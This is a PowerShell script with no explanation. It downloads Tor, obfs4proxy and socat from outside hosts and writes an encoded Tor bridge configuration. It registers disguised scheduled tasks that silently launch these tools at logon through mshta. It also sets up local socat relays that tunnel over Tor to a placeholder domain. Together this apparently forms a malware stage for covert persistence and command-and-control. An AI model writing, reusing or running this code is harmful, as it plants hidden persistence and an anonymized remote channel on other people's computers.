function Unzip
{
param([string]$zipfile, [string]$destination);
$7z = Join-Path $env:Temp '7za.exe';
if (-NOT (Test-Path $7z)){
Try
{
(New-Object System.Net.WebClient).DownloadFile('https://chocolatey.org/7za.exe',$7z);
}
Catch{}
}
if ($(Try { Test-Path $7z.trim() } Catch { $false })){
Start-Process "$7z" -ArgumentList "x -o`"$destination`" -y `"$zipfile`"" -Wait -NoNewWindow
}
else{
$shell = new-object -com shell.application;
$zip = $shell.NameSpace($zipfile);
foreach($item in $zip.items())
{
$shell.Namespace($destination).copyhere($item);
}
}
}
function Base64ToFile
{
param([string]$file, [string]$string);
$bytes=[System.Convert]::FromBase64String($string);
#set-content -encoding byte $file -value $bytes;
[IO.File]::WriteAllBytes($file, $bytes);
}
function AddTask
{
param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
$ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
$td=$ts.NewTask();
$td.RegistrationInfo.Description = 'Does something';
$td.Settings.DisallowStartIfOnBatteries = $False;
$td.Settings.StopIfGoingOnBatteries = $False;
$td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
$LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
$LogonTrigger.StartBoundary=[System.DateTime]::Now;
$LogonTrigger.UserId=$env:username;
$LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
$td.Triggers.Add($LogonTrigger);
if($restart -eq 1){
$TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
$TimeTrigger.StartBoundary=[System.DateTime]::Now;
$TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(20);
$TimeTrigger.Repetition.StopAtDurationEnd=$False;
$td.Triggers.Add($TimeTrigger);
}
$ExecAction=New-Object Microsoft.Win32.TaskScheduler.ExecAction($cmd,$params,$dir);
$td.Actions.Add($ExecAction);
$task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
$task.Run();
}
function ITP{
$File=$env:Temp+'\ts.zip';
$Dest=$env:Temp+'\ts';
(New-Object System.Net.WebClient).DownloadFile('https://api.nuget.org/packages/taskscheduler.2.5.26.nupkg',$File);
if ((Test-Path $Dest) -eq 1){rm -Force -Recurse $Dest;}md $Dest | Out-Null;
Unzip $File $Dest;
rm -Force $File;
$TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
$loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
$TFile=$env:Temp+'\t.zip';
$DestTP=$env:APPDATA+'\MS';
(New-Object System.Net.WebClient).DownloadFile('https://dist.torproject.org/torbrowser/7.0/tor-win32-0.3.0.7.zip',$TFile);
if ((Test-Path $DestTP) -eq 1){rm -Force -Recurse $DestTP;}md $DestTP | Out-Null;
Unzip $TFile $DestTP;
rm -Force $TFile;
$tor=$DestTP+'\Tor\tor.exe';
$obfs4=$DestTP+'\Tor\obfs4proxy.exe';
(New-Object System.Net.WebClient).DownloadFile('https://github.com/garethflowers/tor-browser-portable/raw/master/TorBrowserPortable/App/TorBrowser/TorBrowser/Tor/PluggableTransports/obfs4proxy.exe',$obfs4);
if ($(Try { Test-Path $obfs4.trim() } Catch { $false })){
$tor_dir=$env:APPDATA+'\tor';
if ((Test-Path $tor_dir) -eq 1){rm -Force -Recurse $tor_dir;}md $tor_dir | Out-Null;
$torrc=$tor_dir+'\torrc';
Base64ToFile $torrc 'VXNlQnJpZGdlcyAxDQpDbGllbnRUcmFuc3BvcnRQbHVnaW4gb2JmczQgZXhlYyBvYmZzNHByb3h5LmV4ZSBtYW5hZ2VkDQpCcmlkZ2Ugb2JmczQgMTc4LjYyLjIxOS4yNDI6OTQ0MyAyRUVGRkQ5MUEwRkM2MUNGQUJEMTk3OEU3MkEwMzVGOTJBMzgyODEzIGNlcnQ9QW5uU0c5bGpmZ0FSZjlmZUJ3NVcySUdzdFRYelFpZVhITFh3aFRoZ1NEbXBlZFB1TkROQWFYQjh6cThveWUrWjM0YzhIZyBpYXQtbW9kZT0wDQpCcmlkZ2Ugb2JmczQgMTk0LjEzMi4yMDkuMTU0OjU5ODg4IEI4MzdFRjAzODNDMEIxMzMwQTk4N0I5QzVERkI2RjJDQkRBMzVDQUEgY2VydD1xS0pWd2NzZHhFbFB6TWJvdzIxcm9qSFJDQlpkeEFkd3V4WG5RVTFsZy9zOUlGNWVoKzd1aWltYnBrVEV3Ulh1TVRFUlR3IGlhdC1tb2RlPTANCkJyaWRnZSBvYmZzNCA0NS41NS4xLjc0Ojk0NDMgNkYxOEZFRkJCMENBRUNENUFCQTc1NTMxMkZDQ0IzNEZDMTFBN0FCOCBjZXJ0PXc4SC94NmlnQ3hsaWdiRjJYQkljeE5FV3EremlVOWgxNXJ0d2lrODJvQXFOWFp3SjI1b0h3YWx6UllLNVdPSklBZUtjQ1EgaWF0LW1vZGU9MA0KQnJpZGdlIG9iZnM0IDM4LjIyOS4zMy4xNDY6NDQ5NTAgOTY5RDA3MUJEODlBNjhDMTU5NDkxNTZDRDFDQTI5QTMzQUY2MzVDMiBjZXJ0PXZiYWg2akRrS1MwTlJxVzF4Z0tnNktkM1VucjFQMTI1dkR2RDlGYllvZFovZnNxUS9NV0RLMjc3UE5BSmlHdWR6SEVCR2cgaWF0LW1vZGU9MQ0KQnJpZGdlIG9iZnM0IDE5NC4xMzIuMjA5LjE5OjQxNDc4IDc4M0UyNzZDNjg4OUJGNzM5MDdGMjk1QUE5MzIxOUY3NzYyQkI5MDYgY2VydD1vRDBJeDVQT3JSTVdFMEY0YXRzNFRTYlZIdyt4MzUrQ2VXZXNvbThTNVJ4cjlWNmRUTm9vWGI1UWViRUlGTGU3OFlpY0x3IGlhdC1tb2RlPTANCkJyaWRnZSBvYmZzNCAxOTIuMzYuMzEuMTIyOjQ0OTk0IDYzRjUxNjg4QjM4OTY2NkRCMEYwNTU2QzU2RTk3OTUxNkQyQjlEMzggY2VydD1RS1hJQmcrcmU3ZkxpbW1CTWJKbnRiVTd3d3cwVWExQ2ZPVS9YK1lVc1AxSTNOc3FLUkNKWDlXVDZRVGE5SG1teGkxOFhnIGlhdC1tb2RlPTANCg==';
}
$tor=$tor.Replace('\','/');
$tor_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$tor',0,false))`"";
AddTask 'SUT' 'mshta.exe' $tor_cmd;
$SFile=$env:Temp+'\s.zip';
(New-Object System.Net.WebClient).DownloadFile('https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip',$SFile);
Unzip $SFile $DestTP;
$s_old=$DestTP+'\socat-windows-1.7.2.1\';
rm -Force $SFile;
Rename-Item -path $s_old -newName 's';
$s_fold=$DestTP+'\s\';
$s1cmd='socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
$s2cmd='socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:5588,socksport=9050';
$s1_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$s1cmd',0,false))`"";
$s2_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$s2cmd',0,false))`"";
AddTask 'MRT' 'mshta.exe' $s1_cmd 0 0 $s_fold;
AddTask 'SC' 'mshta.exe' $s2_cmd 0 0 $s_fold;
}
ITP
